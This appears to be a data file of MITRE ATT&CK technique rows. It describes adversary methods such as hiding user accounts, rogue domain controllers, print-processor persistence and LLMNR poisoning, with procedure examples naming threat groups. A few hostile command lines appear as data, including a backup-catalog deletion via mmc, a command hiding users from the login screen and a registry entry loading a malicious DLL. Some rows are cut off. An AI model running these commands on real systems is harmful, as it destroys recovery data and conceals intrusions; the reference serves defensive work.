T1564.002,Hide Artifacts: Hidden Users,"Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users.    In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value  Hide500Users  to  TRUE  in the  /Library/Preferences/com.apple.loginwindow  plist file.   [1]    Every user has a userID associated with it. When the  Hide500Users  key value is set to  TRUE , users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the  dscl  utility to create hidden user accounts by setting the  IsHidden  attribute to  1 . Adversaries can also hide a user’s home folder by changing the  chflags  to hidden.   [2]       Adversaries may similarly hide user accounts in Windows. Adversaries can set the  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList  Registry key value to  0  for a specific user to prevent that user from being listed on the logon screen.   [3]      [4]      On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the  gsettings  command (ex:  sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true ).   [5]    Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",Description

T1564.002,Hide Artifacts: Hidden Users,SMOKEDHAM  has modified the Registry to hide created user accounts from the Windows logon screen.    [3],Procedure Examples
T1480,Execution Guardrails,"Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.   [1]    Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.   [2]      Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical  Virtualization/Sandbox Evasion . While use of  Virtualization/Sandbox Evasion  may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.",Description

T1098.002,Account Manipulation: Additional Email Delegate Permissions,"Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account.    For example, the  Add-MailboxPermission   PowerShell  cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.   [1]      [2]      [3]    In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.   [4]      [5]       Adversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.   [6]      This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add  Additional Cloud Roles  to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex:  Internal Spearphishing ), so the messages evade spam/phishing detection mechanisms.   [7]",Description
T1098.002,Account Manipulation: Additional Email Delegate Permissions,APT28  has used a Powershell cmdlet to grant the  ApplicationImpersonation  role to a compromised account.   [8],Procedure Examples
T1098.002,Account Manipulation: Additional Email Delegate Permissions,"APT29  added their own devices as allowed IDs for active sync using  Set-CASMailbox , allowing it to obtain copies of victim mailboxes.

T1098.002,Account Manipulation: Additional Email Delegate Permissions,Magic Hound  granted compromised email accounts read access to the email boxes of additional targeted accounts. The group then was able to authenticate to the intended victim's OWA (Outlook Web Access) portal and read hundreds of email communications for information on Middle East organizations.   [2],Procedure Examples
T1207,Rogue Domain Controller,"Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC.    [1]    Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.   Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash.    [2]      This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors).    [1]    The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform  SID-History Injection  and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence.    [1]",Description
T1207,Rogue Domain Controller,Mimikatz ’s  LSADUMP::DCShadow  module can be used to make AD updates by temporarily setting a computer to be a DC.   [3]      [2],Procedure Examples
T1594,Search Victim-Owned Websites,"Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex:  Email Addresses ). These sites may also have details highlighting business operations and relationships.   [1]      Adversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  Phishing for Information  or  Search Open Technical Databases ), establishing operational resources (ex:  Establish Accounts  or  Compromise Accounts ), and/or initial access (ex:  Trusted Relationship  or  Phishing ).",Description
T1594,Search Victim-Owned Websites,EXOTIC LILY  has used contact forms on victim websites to generate phishing e-mails.   [2],Procedure Examples

T1594,Search Victim-Owned Websites,"Silent Librarian  has searched victim's websites to identify the interests and academic areas of targeted individuals and to scrape source code, branding, and organizational contact information for phishing pages.   [5]      [6]      [7]",Procedure Examples
T1547.012,Boot or Logon Autostart Execution: Print Processors,"Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot.    Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the  AddPrintProcessor  API call with an account that has  SeLoadDriverPrivilege  enabled. Alternatively, a print processor can be registered to the print spooler service by adding the  HKLM\SYSTEM\[CurrentControlSet or ControlSet001]\Control\Print\Environments\[Windows architecture: e.g., Windows x64]\Print Processors\[user defined]\Driver  Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the  GetPrintProcessorDirectory  API call.   [1]    After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.   [2]    The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",Description
T1547.012,Boot or Logon Autostart Execution: Print Processors,"Earth Lusca  has added the Registry key  HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\UDPrint"" /v Driver /d ""spool.dll /f  to load malware as a Print Processor.   [3]",Procedure Examples

T1567.001,Exfiltration Over Web Service: Exfiltration to Code Repository,"Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.   Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.",Description
T1567.001,Exfiltration Over Web Service: Exfiltration to Code Repository,Empire  can use GitHub for data exfiltration.   [1],Procedure Examples
T1591.001,Gather Victim Org Information: Determine Physical Locations,"Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.   Adversaries may gather this information in various ways, such as direct elicitation via  Phishing for Information . Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex:  Search Victim-Owned Websites  or  Social Media ).   [1]      [2]    Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  Phishing for Information  or  Search Open Websites/Domains ), establishing operational resources (ex:  Develop Capabilities  or  Obtain Capabilities ), and/or initial access (ex:  Phishing  or  Hardware Additions ).",Description
T1027.003,Obfuscated Files or Information: Steganography,"Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.    Duqu  was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.   [1]       By the end of 2017, a threat group used  Invoke-PSImage  to hide  PowerShell  commands in an image file (.png) and execute the code on a victim's system. In this particular case the  PowerShell  code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.   [2]",Description

T1574.011,Hijack Execution Flow: Services Registry Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under  HKLM\SYSTEM\CurrentControlSet\Services . The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,   PowerShell , or  Reg . Access to Registry keys is controlled through access control lists and user permissions.    [1]      [2]      If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).   Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the  FailureCommand  key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.   [3]      [4]      The  Performance  key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.   [5]    If the  Performance  key is not already present and if an adversary-controlled user has the  Create Subkey  permission, adversaries may create the  Performance  key in the service’s Registry tree to point to a malicious DLL.   [6]      Adversaries may also add the  Parameters  key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.   [5]      [7]    Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll .

T1480.001,Execution Guardrails: Environmental Keying,"Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of  Execution Guardrails  that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.   [1]      Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.   [2]      [3]      [4]      [5]      [6]    By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.   [2]      [6]    These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).   Similar to  Obfuscated Files or Information , adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.   [2]      [4]      [5]      [6]      [7]    By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.   [2]    This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.   Like other  Execution Guardrails , environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical  Virtualization/Sandbox Evasion . While use of  Virtualization/Sandbox Evasion  may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.",Description

T1648,Serverless Execution,"Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers.    Adversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e.  Resource Hijacking ).   [1]    Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use the  IAM:PassRole  permission in AWS or the  iam.serviceAccounts.actAs  permission in Google Cloud to add  Additional Cloud Roles  to a serverless cloud function, which may then be able to perform actions the original user cannot.   [2]      [3]      Serverless functions can also be invoked in response to cloud events (i.e.  Event Triggered Execution ), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds  Additional Cloud Credentials  to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created.   [4]    Similarly, an adversary may create a Power Automate workflow in Office 365 environments that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint.   [5]      [6]",Description
T1080,Taint Shared Content,"Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.   A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses  Shortcut Modification  of directory .LNK files that use  Masquerading  to look like the real directories, which are hidden through  Hidden Files and Directories . The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts.    [1]      Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",Description

Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.   The SSP configuration is stored in two Registry keys:  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages  and  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages . An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.   [1]",Description

T1195.001,Supply Chain Compromise: Compromise Software Dependencies and Development Tools,Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.   [1]        Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.,Description
T1195.001,Supply Chain Compromise: Compromise Software Dependencies and Development Tools,XCSSET  adds malicious code to a host's Xcode projects by enumerating CocoaPods  target_integrator.rb  files under the  /Library/Ruby/Gems  folder or enumerates all  .xcodeproj  folders under a given directory.  XCSSET  then downloads a script and Mach-O file into the Xcode project folder.   [2],Procedure Examples
T1220,XSL Script Processing,"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.    [1]      Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to  Trusted Developer Utilities Proxy Execution , the Microsoft common line transformation utility binary (msxsl.exe)    [2]    can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.    [3]    Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.    [4]    Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.   [5]      Command-line examples:   [3]      [5]      Another variation of this technique, dubbed ""Squiblytwo"", involves using  Windows Management Instrumentation  to invoke JScript or VBScript within an XSL file.   [6]    This technique can also execute local/remote scripts and, similar to its  Regsvr32 / ""Squiblydoo"" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in  Windows Management Instrumentation  provided they utilize the /FORMAT switch.   [5]      Command-line examples:   [5]      [6]",Description

T1021.003,Remote Services: Distributed Component Object Model,"Adversaries may use  Valid Accounts  to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.   The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.   [1]      [2]      Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.   [3]    By default, only Administrators may remotely activate and launch COM objects through DCOM.   [4]      Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications   [5]    as well as other Windows objects that contain insecure methods.   [6]      [7]    DCOM can also execute macros in existing documents   [8]    and may also invoke  Dynamic Data Exchange  (DDE) execution directly through a COM created instance of a Microsoft Office application   [9]   , bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with  Windows Management Instrumentation .    [10]",Description

T1218.014,System Binary Proxy Execution: MMC,"Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.   [1]      [2]    MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.   [3]      For example,  mmc C:\Users\foo\admintools.msc /a  will open a custom, saved console msc file in author mode.   [1]    Another common example is  mmc gpedit.msc , which will open the Group Policy Editor application window.    Adversaries may use MMC commands to perform malicious tasks. For example,  mmc wbadmin.msc delete catalog -quiet  deletes the backup catalog on the system (i.e.  Inhibit System Recovery ) without prompts to the user (Note:  wbadmin.msc  may only be present by default on Windows Server operating systems).   [4]      [5]      Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a  Component Object Model  class object.   [6]    Then, adversaries may create custom consoles with the ""Link to Web Address"" snap-in that is linked to the malicious CLSID subkey.   [7]    Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command:  mmc.exe -Embedding C:\path\to\test.msc .   [8]",Description
T1498.002,Network Denial of Service: Reflection Amplification,"Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target.   [1]    This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.   Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS   [2]    and NTP   [3]   , though the use of several others in the wild have been documented.   [4]     In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.   [5]",Description

T1598,Phishing for Information,"Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from  Phishing  in that the objective is gathering data from the victim rather than executing malicious code.   All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.   Adversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.   [1]      [2]      [3]      [4]      [5]    Phishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex:  Establish Accounts  or  Compromise Accounts ) and/or sending multiple, seemingly urgent messages.",Description

T1598,Phishing for Information,ZIRCONIUM  targeted presidential campaign staffers with credential phishing e-mails.   [8],Procedure Examples
T1222,File and Directory Permissions Modification,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.   [1]      [2]    File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).   Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via  Accessibility Features ,  Boot or Logon Initialization Scripts ,  Unix Shell Configuration Modification , or tainting/hijacking other instrumental binary/configuration files via  Hijack Execution Flow .   Adversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.   [3]      [4]      [5]      [6]      [7]",Description
T1217,Browser Bookmark Discovery,"Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.   Browser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially  Credentials In Files  associated with logins cached by a browser.   Specific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases.",Description

T1564.005,Hide Artifacts: Hidden File System,"Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.   [1]      Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.   [1]      [2]    Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.   [3]    Adversaries may also fragment files across the existing file system structure in non-standard ways.   [4]",Description

T1587.002,Develop Capabilities: Code Signing Certificates,"Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.   [1]    Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.   Prior to  Code Signing , adversaries may develop self-signed code signing certificates for use in operations.",Description

T1587.001,Develop Capabilities: Malware,"Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.   [1]      [2]      [3]      [4]      As with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.   Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of  Web Services .   [5]",Description

T1190,Exploit Public-Facing Application,"Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other applications with Internet accessible open sockets, such as web servers and related services.   [1]      [2]      [3]      [4]      [5]    Depending on the flaw being exploited this may include  Exploitation for Defense Evasion .    If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via  Escape to Host , or take advantage of weak identity and access management policies.

T1568.001,Dynamic Resolution: Fast Flux DNS,"Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.   [1]      [2]      [3]      The simplest, ""single-flux"" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.   [3]      In contrast, the ""double-flux"" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.",Description

T1137,Office Application Startup,"Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.   A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.   [1]    These persistence mechanisms can work within Outlook or be used through Office 365.   [2]",Description

[5]",Procedure Examples
T1584,Compromise Infrastructure,"Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.   [1]      [2]      [3]      [4]    Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.   Use of compromised infrastructure allows an adversary to stage, launch, and execute an operation. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with  Digital Certificates ) to further blend in and support staged information gathering and/or  Phishing  campaigns.   [5]       By using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.   [6]",Description
T1587,Develop Capabilities,"Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.   [1]      [2]      [3]      [4]      As with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.",Description
T1587,Develop Capabilities,Kimsuky  created and used a mailing toolkit to use in spearphishing attacks.   [5],Procedure Examples
T1557.001,Adversary-in-the-Middle: LLMNR or NBT-NS Poisoning and SMB Relay,"By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.    Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.    [1]      [2]      Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through  Network Sniffing  and crack the hashes offline through  Brute Force  to obtain the plaintext passwords.   In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.   [3]      [4]    Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.    Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and  Responder .

A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.   [1]    Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale  Phishing  or Distributed Denial of Service (DDoS).   [2]      [3]      [4]      [5]",Description
T1505.004,Server Software Component: IIS Components,"Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions:  Get{Extension/Filter}Version ,  Http{Extension/Filter}Proc , and (optionally)  Terminate{Extension/Filter} . IIS modules may also be installed to extend IIS web servers.   [1]      [2]      [3]      [4]      Adversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.   [2]      [1]      [5]      [6]      [4]      [7]      Adversaries may also install malicious IIS modules to observe and/or modify traffic.

Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.   Adversaries may scan IP blocks in order to  Gather Victim Network Information , such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.   [1]    Information from these scans may reveal opportunities for other forms of reconnaissance (ex:  Search Open Websites/Domains  or  Search Open Technical Databases ), establishing operational resources (ex:  Develop Capabilities  or  Obtain Capabilities ), and/or initial access (ex:  External Remote Services ).",Description

